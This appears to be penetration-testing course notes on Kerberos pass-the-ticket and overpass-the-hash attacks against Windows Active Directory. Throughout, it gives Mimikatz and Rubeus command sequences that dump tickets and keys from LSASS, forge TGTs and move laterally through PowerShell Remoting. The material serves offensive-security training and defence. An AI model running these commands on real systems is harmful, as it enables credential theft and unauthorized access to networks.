We need a valid Kerberos ticket to perform pass the ticket attack, it can be TGS or TGT.

## Harvesting Kerberos Tickets from Windows

On Windows, tickets are processed and stored by the LSASS process, as a non-administrator user you can only get your tickets, but as a local administrator you can collect anything.

We can harvest all tickets from a system using the `Mimikatz` module `sekurlsa::tickets /export`. The result is a list of files with the extension `.kirbi`, which contain the tickets.

### Mimikatz - Export Tickets
```cmd-session
c:\tools> mimikatz.exe

mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export
mimikatz # exit

c:\tools> dir *.kirbi
```

Tickets that end with `$` correspond to the computer account, which needs a ticket to interact with the AD, user tickets have username, followed by `@` that separates the service name and the domain, for example `[randomvalue]-username@service-domain.local.kirbi`.

**Note:** If you pick a ticket with the service krbtgt, it corresponds to the TGT of that account.

We can also use `Rubeus` to export tickets with the option `dump`, it can be use to dump all ticket (if running as local administrator), it will print the ticket encoded in base64 format, we can add `/nowrap` for easier copy-paste.

**Note:** At the time of writing, using Mimikatz version 2.2.0 20220919, if we run "sekurlsa::ekeys" it presents all hashes as des_cbc_md4 on some Windows 10 versions. Exported tickets (sekurlsa::tickets /export) do not work correctly due to the wrong encryption. It is possible to use these hashes to generate new tickets or use Rubeus to export tickets in base64 format.

### Rubeus - Export Tickets
```cmd-session
c:\tools> Rubeus.exe dump /nowrap
```

We can forge our own Kerberos ticket with the `OverPass the Hash or Pass the Key` technique.

## Pass the Key or OverPass the Hash

With PtH we reuse an NTLM hash without touching Kerberos, with pass the key approach we convert a hash/key of a domain joined machine into a TGT.

To forge tickets we need to have the user's hash, the `sekurlsa::ekeys` module from Mimikatz can be used to dump all users Kerberos encryption keys, of all types of keys that can be presented.

### Mimikatz - Extract Kerberos Keys
```cmd-session
c:\tools> mimikatz.exe

mimikatz # privilege::debug
mimikatz # sekurlsa::ekeys
```

With access to the `AES256_HMAC` and `RC4_HMAC` keys we can perform the attack using Mimikatz or Rubeus.

### Mimikatz - Pass the Key or OverPass the Hash
```cmd-session
c:\tools> mimikatz.exe

mimikatz # privilege::debug
mimikatz # sekurlsa::pth /domain:<domain> /user:<username> /ntlm:<hash>
```

It will create a new `cmd.exe` window in the context of the user.

To use Rubeus to forge the ticket we can use the `asktgt` module with `/rc4`, `/aes128`, `/aes256`, or `/des` hash.

### Rubeus - Pass the Key or OverPass the Hash
```cmd-session
c:\tools> Rubeus.exe  asktgt /domain:<domain> /user:<username> /aes256:<hash> /nowrap
```

**Note:** Mimikatz requires administrative rights to perform the Pass the Key/OverPass the Hash attacks, while Rubeus doesn't.

**Note:** Modern Windows domains (functional level 2008 and above) use AES encryption by default in normal Kerberos exchanges. If we use a rc4_hmac (NTLM) hash in a Kerberos exchange instead of an aes256_cts_hmac_sha1 (or aes128) key, it may be detected as an "encryption downgrade."

## Pass the Ticket (PtT)

We can use `/ptt` with Rubeus to submit the ticket for the current logon session instead of getting the ticket in `base64` format.

### Rubeus Pass the Ticket
```cmd-session
c:\tools> Rubeus.exe asktgt /domain:<domain> /user:<username> /rc4:<hash> /ptt
```

We can also import the ticket into the current session using the `.kirbi` file from Mimikatz.

### Rubeus - Pass the Ticket
```cmd-session
c:\tools> Rubeus.exe ptt /ticket:<.kirbi file>
```

We can also use the base64 output from Rubeus or convert a .kirbi to base64 to perform the Pass the Ticket attack. We can use PowerShell to convert a .kirbi to base64.

### Convert .kirbi to Base64 Fromat
```powershell-session
PS c:\tools> [Convert]::ToBase64String([IO.File]::ReadAllBytes("<.kirbi ticket>"))
```

### Pass the Ticket - Base64 Format
```cmd-session
c:\tools> Rubeus.exe ptt /ticket:<base64 string>
```

We can also use the `kerberos::ptt` module from Mimikatz to perform the Pass the Ticket attack, using the `.kirbi` file.

### Mimikatz - Pass the Ticket
```cmd-session
C:\tools> mimikatz.exe

mimikatz # privilege::debug
mimikatz # kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\<.kirbi file>"
mimikatz # exit

c:\tools> dir \\DC01.inlanefreight.htb\c$
```

**Note:** Instead of opening mimikatz.exe with cmd.exe and exiting to get the ticket into the current command prompt, we can use the Mimikatz module `misc` to launch a new command prompt window with the imported ticket using the `misc::cmd` command.

## Pass the Ticket with PowerShell Remoting (Windows)

[PowerShell Remoting](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2) allows us to run scripts or commands on a remote computer, using it creates both HTTP and HTTPS listeners, which run on a standard port TCP/5985 for HTTP and TCP/5986 for HTTPS.

To create a PowerShell Remoting session on a remote computer, you must have administrative permissions, be a member of the Remote Management Users group, or have explicit PowerShell Remoting permissions in your session configuration.

### Mimikatz - PowerShell Remoting with Pass the Ticket

We can use Mimikatz to import a ticket then open a PowerShell console and connect to the target machine.

#### Mimikatz - Pass the Ticket for Lateral Movement
```cmd-session
C:\tools> mimikatz.exe

mimikatz # privilege::debug
mimikatz # kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\<.kirbi ticket>"
mimikatz # exit

c:\tools>powershell

PS C:\tools> Enter-PSSession -ComputerName <computer name>
```

### Rubeus - PowerShell Remoting with Pass the Ticket

Rubeus has the option `createnetonly` which creates a sacrificial process/logon session ([Logon type 9](https://eventlogxp.com/blog/logon-type-what-does-it-mean/)) which is hidden by default, but we can use `/show` to display the process, and the result is the equivalent of `runas /netonly`. This prevents the erasure of existing TGTs for the current logon session.

#### Create a Sacrificial Process with Rubeus
```cmd-session
C:\tools> Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
```

The above command will open a new cmd window. From that window, we can execute Rubeus to request a new TGT with the option `/ptt` to import the ticket into our current session and connect to the DC using PowerShell Remoting.

#### Rubeus - Pass the Ticket for Lateral Movement
```cmd-session
C:\tools> Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<hash> /ptt
c:\tools>powershell
PS C:\tools> Enter-PSSession -ComputerName <computer name>
```